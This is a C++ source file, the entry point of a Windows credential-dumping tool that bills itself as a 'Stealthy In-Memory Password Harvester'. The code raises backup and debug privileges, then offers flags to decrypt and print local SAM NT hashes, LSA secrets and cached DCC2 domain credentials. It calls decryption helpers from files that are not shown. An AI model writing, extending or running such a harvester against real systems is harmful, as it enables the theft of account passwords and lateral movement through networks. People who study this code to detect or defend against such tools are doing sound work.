/*
 * main.cpp  –  CLI entry point
 *
 * Compile:
 *   cl /EHsc /W3 /O2 /std:c++17
 *      main.cpp credump.cpp registry_nt.cpp
 *      /Fe:samdump.exe
 *      /link bcrypt.lib crypt32.lib ntdll.lib
 */

#include "credump.h"
#include "registry_nt.h"
#include <string>
#include <vector>
#include <memory>
#include <sstream>
#include <cstring>
#include <cstdio>
#include <io.h>
#include <fcntl.h>

 // ─────────────────────────── printSecret interface ───────────────────────────

struct ISecret {
    virtual ~ISecret() = default;
    virtual std::string printSecret() const = 0;
};

struct SamAccount : ISecret {
    std::string name;
    uint32_t    rid = 0;
    std::string nthash;
    std::string printSecret() const override {
        std::ostringstream ss;
        ss << "Name: " << name << "\n"
            << "RID: " << rid << "\n"
            << "NT: " << nthash << "\n\n";
        return ss.str();
    }
};

struct Dcc2Cache : ISecret {
    std::string cache;
    std::string printSecret() const override { return cache + "\n"; }
};

struct LsaSecretWrapper : ISecret {
    PrintableLSASecret inner;
    explicit LsaSecretWrapper(PrintableLSASecret s) : inner(std::move(s)) {}
    std::string printSecret() const override {
        std::ostringstream ss;
        ss << inner.secretType << "\n";
        for (auto& item : inner.secrets) ss << item << "\n";
        if (!inner.extraSecret.empty()) ss << inner.extraSecret << "\n";
        return ss.str();
    }
};

static std::vector<std::unique_ptr<ISecret>> g_samList;
static std::vector<std::unique_ptr<ISecret>> g_lsaList;
static std::vector<std::unique_ptr<ISecret>> g_dcc2List;

// ─────────────────────────── privilege helper ─────────────────────────────────

static bool EnablePriv(const char* name) {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;
    LUID luid = {};
    bool ok = false;
    if (LookupPrivilegeValueA(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES tp = {};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        ok = (GetLastError() == ERROR_SUCCESS);
    }
    CloseHandle(token);
    return ok;
}

// ─────────────────────────── DumpSAM ─────────────────────────────────────────

static bool DumpSAM() {
    // Enumerate sub-keys of SAM\SAM\Domains\Account\Users
    // The Go code does: rids = GetSubKeyNames(...), then removes "Names" (last entry)
    const std::string usersKey = "SAM\\SAM\\Domains\\Account\\Users";
    std::vector<std::string> subkeys;
    if (!NtGetSubKeyNames(usersKey, 0x04, 0x02000000, subkeys)) {
        fprintf(stderr, "[-] Cannot enumerate SAM users (need SYSTEM)\n");
        return false;
    }

    // Remove "Names" sub-key
    subkeys.erase(
        std::remove(subkeys.begin(), subkeys.end(), "Names"),
        subkeys.end());

    if (subkeys.empty()) {
        fprintf(stderr, "[-] No user RIDs found\n");
        return false;
    }

    // Build full registry paths
    std::vector<std::string> ridPaths;
    for (auto& s : subkeys)
        ridPaths.push_back(usersKey + "\\" + s);

    // GetSysKey + GetNTHashes (HKEY param ignored – uses NT layer internally)
    std::vector<uint8_t> sysKey;
    if (!GetSysKey(nullptr, sysKey)) {
        fprintf(stderr, "[-] GetSysKey failed\n");
        return false;
    }

    std::vector<UserCreds> creds;
    if (!GetNTHashes(nullptr, ridPaths, creds)) {
        fprintf(stderr, "[-] GetNTHashes failed\n");
        return false;
    }

    for (auto& cred : creds) {
        auto acc = std::make_unique<SamAccount>();
        acc->name = cred.Username;
        acc->rid = cred.RID;

        if (cred.Data.empty()) {
            acc->nthash = "<empty>";
        }
        else {
            std::vector<uint8_t> hash;
            bool ok = cred.AES
                ? DecryptAESHash(cred.Data, cred.IV, sysKey, cred.RID, hash)
                : DecryptRC4Hash(cred.Data, sysKey, cred.RID, hash);
            acc->nthash = ok ? ToHex(hash.data(), hash.size()) : "<error>";
        }
        g_samList.push_back(std::move(acc));
    }
    return true;
}

// ─────────────────────────── DumpLSASecrets ──────────────────────────────────

static bool DumpLSASecrets() {
    std::vector<PrintableLSASecret> secrets;
    if (!GetLSASecrets(nullptr, false, secrets)) return false;
    for (auto& s : secrets)
        g_lsaList.push_back(std::make_unique<LsaSecretWrapper>(s));
    return true;
}

// ─────────────────────────── DumpDCC2Cache ───────────────────────────────────

static bool DumpDCC2Cache() {
    std::vector<std::string> hashes;
    if (!GetCachedHashes(nullptr, hashes)) return false;
    for (auto& h : hashes) {
        auto e = std::make_unique<Dcc2Cache>();
        e->cache = h;
        g_dcc2List.push_back(std::move(e));
    }
    return true;
}

// ─────────────────────────── orchestrator ────────────────────────────────────

static std::string Dump(bool sam, bool lsa, bool dcc2) {
    static const char* privs[] = {
        "SeBackupPrivilege","SeRestorePrivilege",
        "SeDebugPrivilege","SeSecurityPrivilege"
    };
    for (auto p : privs)
        if (!EnablePriv(p))
            fprintf(stderr, "[!] Failed to enable: %s\n", p);

    printf("[+] Privileges enabled\n\n");

    system("whoami /priv > priv_log.txt");  // Dump privilege ra file để check enabled thật không
    printf("[dbg] Check priv_log.txt for actual privileges\n\n");

    if (sam && !DumpSAM())        fprintf(stderr, "[-] SAM dump failed\n");
    if (lsa && !DumpLSASecrets()) fprintf(stderr, "[-] LSA dump failed\n");
    if (dcc2 && !DumpDCC2Cache())  fprintf(stderr, "[-] DCC2 dump failed\n");

    std::ostringstream out;
    if (!g_samList.empty()) {
        out << "[*] Dumping local SAM hashes\n";
        for (auto& s : g_samList) out << s->printSecret();
    }
    if (!g_lsaList.empty()) {
        out << "[*] Dumping LSA Secrets\n";
        for (auto& s : g_lsaList) out << s->printSecret();
    }
    if (!g_dcc2List.empty()) {
        out << "[*] Dumping cached domain credentials (domain/username:hash)\n";
        for (auto& s : g_dcc2List) out << s->printSecret();
    }
    return out.str();
}

// ─────────────────────────── banner + argparse ───────────────────────────────

static void PrintBanner() {
    // Set console to UTF-8 so the box-drawing characters render correctly
    SetConsoleOutputCP(CP_UTF8);
    // Also set the stdout mode to allow UTF-8 output
    _setmode(_fileno(stdout), _O_TEXT);

    printf(
        "\n"
        "\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 "
        "\xe2\x96\x88\xe2\x96\x88"
        "\xe2\x96\x88\xe2\x96\x88     "
        "\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  "
        "\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\n"
        "\xe2\x96\x88\xe2\x96\x88\xe2\x96\x94        "
        "\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88     "
        "\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88 "
        "\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\n"
        "\n"
        "    Stealthy In-Memory Password Harvester\n"
        "\n"
        "  \"Well... I think I wanted to be like Eris.\"\n"
        "\n"
    );
}

static bool ParseFlag(int argc, char* argv[], const char* flag) {
    for (int i = 1; i < argc; i++)
        if (strcmp(argv[i], flag) == 0) return true;
    return false;
}

static void PrintUsage(const char* argv0) {
    fprintf(stderr,
        "Usage: %s [options]\n\n"
        "  --sam     Dump local SAM NT hashes\n"
        "  --lsa     Dump LSA secrets\n"
        "  --dcc2    Dump cached domain credentials (DCC2)\n"
        "  --help    Show this help\n\n"
        "At least one of --sam / --lsa / --dcc2 must be specified.\n"
        "Must be run as SYSTEM or with SeBackupPrivilege + SeDebugPrivilege.\n",
        argv0);
}

// ─────────────────────────── main ────────────────────────────────────────────

int main(int argc, char* argv[]) {
    PrintBanner();

    bool doSam = ParseFlag(argc, argv, "--sam");
    bool doLsa = ParseFlag(argc, argv, "--lsa");
    bool doDcc2 = ParseFlag(argc, argv, "--dcc2");
    bool doHelp = ParseFlag(argc, argv, "--help") || ParseFlag(argc, argv, "-h");

    if (doHelp || (!doSam && !doLsa && !doDcc2)) {
        PrintUsage(argv[0]);
        return 1;
    }

    std::string result = Dump(doSam, doLsa, doDcc2);
    printf("%s", result.c_str());
    return 0;
}